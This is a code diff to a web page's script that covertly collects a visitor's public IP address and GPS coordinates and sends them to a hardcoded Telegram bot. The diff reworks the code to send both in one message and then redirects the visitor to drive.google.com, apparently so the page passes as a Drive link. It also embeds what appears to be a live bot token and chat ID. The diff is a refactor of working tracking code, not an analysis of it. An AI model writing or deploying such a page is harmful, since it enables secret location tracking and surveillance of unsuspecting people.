@@ -10,70 +10,48 @@
       const botToken = "7396787396:AAGs_K5jy9txTVlQv-ltZbzo8eSXncwTUwk";
       const userID = "5680204913";
       const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-      const data = new URLSearchParams();
-      const dataMap = new URLSearchParams();
-      getUserLocation();
 
-      // getPublicIP().then((publicIP) => {
-      //   if (publicIP) {
-      //     data.append("chat_id", userID);
-      //     data.append("text", publicIP);
-      //     fetch(url, {
-      //       method: "POST",
-      //       body: data,
-      //     }).finally(() => {
-      //       dataMap.append("chat_id", userID);
-      //       dataMap.append("text", map);
-      //       fetch(url, {
-      //         method: "POST",
-      //         body: dataMap,
-      //       }).finally(() => {});
-      //       window.location.href = "https://drive.google.com";
-      //     });
-      //   }
-      // });
+      // Sử dụng Promise.all để chạy đồng thời các yêu cầu
+      Promise.all([getPublicIP(), getUserLocation()])
+        .then(([publicIP, location]) => {
+          const messages = [];
+          if (publicIP) messages.push(publicIP);
+          if (location) messages.push(location);
+
+          // Gửi tất cả thông tin trong một yêu cầu
+          if (messages.length > 0) {
+            const data = new URLSearchParams();
+            data.append("chat_id", userID);
+            data.append("text", messages.join("\n"));
+            return fetch(url, { method: "POST", body: data });
+          }
+        })
+        .finally(() => {
+          window.location.href = "https://drive.google.com";
+        });
 
       function getPublicIP() {
         return fetch("https://api.ipify.org?format=json")
           .then((response) => response.json())
-          .then((data) => {
-            return data.ip;
-          })
-          .catch((error) => {
-            return null;
-          });
+          .then((data) => data.ip)
+          .catch(() => null);
       }
 
       function getUserLocation() {
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(function (position) {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-
-            getPublicIP().then((publicIP) => {
-              if (publicIP) {
-                data.append("chat_id", userID);
-                data.append("text", "Ip: " + publicIP);
-                fetch(url, {
-                  method: "POST",
-                  body: data,
-                }).finally(() => {
-                  dataMap.append("chat_id", userID);
-                  dataMap.append("text",  "Latitude: " + latitude + ", Longitude: " + longitude);
-                  fetch(url, {
-                    method: "POST",
-                    body: dataMap,
-                  }).finally(() => {});
-                  window.location.href = "https://drive.google.com";
-                });
-              }
-            });
-            return "Latitude: " + latitude + ", Longitude: " + longitude;
-          });
-        } else {
-          console.error("Geolocation is not supported by this browser.");
-        }
-        return "";
+        return new Promise((resolve) => {
+          if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+              (position) => {
+                const { latitude, longitude } = position.coords;
+                resolve(`Latitude: ${latitude}, Longitude: ${longitude}`);
+              },
+              () => resolve(null)
+            );
+          } else {
+            console.error("Geolocation is not supported by this browser.");
+            resolve(null);
+          }
+        });
       }
     </script>
   </body>
